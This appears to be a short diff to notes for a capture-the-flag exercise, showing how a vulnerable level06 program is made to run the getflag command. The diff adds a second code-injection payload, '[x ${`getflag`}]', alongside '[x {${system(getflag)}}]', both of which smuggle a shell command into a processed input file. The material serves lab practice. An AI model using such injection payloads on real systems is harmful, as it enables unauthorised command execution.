@@ -7,5 +7,6 @@
 ### vim /tmp/getflag && ./level06 /tmp/getflag
 
 ### [x {${system(getflag)}}]
+or [x ${`getflag`}]
 
 ###:wq
